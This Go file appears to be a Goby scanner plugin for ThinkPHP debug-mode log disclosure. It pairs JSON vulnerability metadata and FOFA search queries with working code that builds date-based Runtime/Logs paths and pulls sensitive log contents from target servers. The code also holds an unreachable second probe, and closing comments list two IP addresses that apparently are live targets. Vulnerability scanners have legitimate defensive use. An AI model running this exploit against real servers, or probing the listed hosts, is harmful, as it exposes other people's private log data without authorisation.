package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "ThinkPHP Debug Mode Log Information Disclosure Vulnerability",
    "Description": "<p>ThinkPHP is a free and open source, fast and simple object-oriented lightweight PHP development framework.</p><p>ThinkPHP Debug mode has a log information disclosure vulnerability. When Debug is turned on, logs will be generated in the Runtime directory. Attackers can read sensitive log information by constructing a special URL address.</p>",
    "Product": "ThinkPHP",
    "Homepage": "http://www.thinkphp.cn/",
    "DisclosureDate": "2021-11-03",
    "Author": "Chin",
    "FofaQuery": "(((header=\"thinkphp\" || header=\"think_template\") && header!=\"couchdb\" && header!=\"St: upnp:rootdevice\") || body=\"href=\\\"http://www.thinkphp.cn\\\">ThinkPHP</a><sup>\" || ((banner=\"thinkphp\" || banner=\"think_template\") && banner!=\"couchdb\" && banner!=\"St: upnp:rootdevice\") || (body=\"ThinkPHP\" && body=\"internal function\"))",
    "GobyQuery": "(((header=\"thinkphp\" || header=\"think_template\") && header!=\"couchdb\" && header!=\"St: upnp:rootdevice\") || body=\"href=\\\"http://www.thinkphp.cn\\\">ThinkPHP</a><sup>\" || ((banner=\"thinkphp\" || banner=\"think_template\") && banner!=\"couchdb\" && banner!=\"St: upnp:rootdevice\") || (body=\"ThinkPHP\" && body=\"internal function\"))",
    "Level": "1",
    "Impact": "<p>ThinkPHP Debug mode has a log information disclosure vulnerability. When Debug is turned on, logs will be generated in the Runtime directory. Attackers can read sensitive log information by constructing a special URL address.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.thinkphp.cn/\">http://www.thinkphp.cn/</a> </p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If unnecessary, prohibit public access to the system. </p><p>3. Delete all files under Runtime/Logs and set APP_DEBUG to false. </p>",
    "References": [
        "https://fofa.so/"
    ],
    "Translation": {
        "EN": {
            "Name": "ThinkPHP Debug Mode Log Information Disclosure Vulnerability",
            "Product": "ThinkPHP",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ],
            "Description": "<p>ThinkPHP is a free and open source, fast and simple object-oriented lightweight PHP development framework.<br></p><p>ThinkPHP Debug mode has a log information disclosure vulnerability. When Debug is turned on, logs will be generated in the Runtime directory. Attackers can read sensitive log information by constructing a special URL address.<br></p>",
            "Impact": "<p>ThinkPHP Debug mode has a log information disclosure vulnerability. When Debug is turned on, logs will be generated in the Runtime directory. Attackers can read sensitive log information by constructing a special URL address.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.thinkphp.cn/\">http://www.thinkphp.cn/</a> </p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If unnecessary, prohibit public access to the system. </p><p>3. Delete all files under Runtime/Logs and set APP_DEBUG to false. </p>"
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "log",
            "type": "input",
            "value": "21_11_02.log",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/thinkphp3/Application/Runtime/Logs/Home/21_11_02.log",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "INFO",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "START",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "END",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/thinkphp3/Runtime/Logs/Home/21_11_02.log",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "INFO",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "START",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "END",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/Application/Runtime/Logs/Home/21_11_02.log",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Runtime/Logs/Home/21_11_02.log",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10958"
}`

	doGetFunc := func(u *httpclient.FixUrl,uri string) string {
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls=false
		resp,_ := httpclient.DoHttpRequest(u,cfg)
		return resp.RawBody
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			reg := regexp.MustCompile("(([0-9]*)?)-(([0-9]*)?)-(([0-9]*)?)").FindStringSubmatch((time.Now()).String())
			uri1 := fmt.Sprintf("/Application/Runtime/Logs/Home/%s_%s_%s.log",reg[1][2:],reg[3],reg[5])
			uri2 := fmt.Sprintf("/Runtime/Logs/Home/%s_%s_%s.log",reg[1][2:],reg[3],reg[5])
			respRaw1 := doGetFunc(u,uri1)
			return strings.Contains(respRaw1,"INFO") && strings.Contains(respRaw1,"START") && strings.Contains(respRaw1,"END")

			respRaw2 := doGetFunc(u,uri2)
			return strings.Contains(respRaw2,"INFO") && strings.Contains(respRaw2,"START") && strings.Contains(respRaw2,"END")
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			log := ss.Params["log"].(string)
			//reg := regexp.MustCompile("(([0-9]*)?)-(([0-9]*)?)-(([0-9]*)?)").FindStringSubmatch((time.Now()).String())
			uri1 := fmt.Sprintf("/Application/Runtime/Logs/Home/%s",log)
			uri2 := fmt.Sprintf("/Runtime/Logs/Home/%s",log)
			respRaw1 := doGetFunc(expResult.HostInfo,uri1)
			if strings.Contains(respRaw1,"INFO") && strings.Contains(respRaw1,"START") && strings.Contains(respRaw1,"END"){
				expResult.Success=true
				expResult.Output = respRaw1
			}
			respRaw2 := doGetFunc(expResult.HostInfo,uri2)
			if strings.Contains(respRaw2,"INFO") && strings.Contains(respRaw2,"START") && strings.Contains(respRaw2,"END"){
				expResult.Success=true
				expResult.Output = respRaw2
			}
			return expResult
		},
	))
}

//http://47.111.5.93:443
//http://120.24.242.49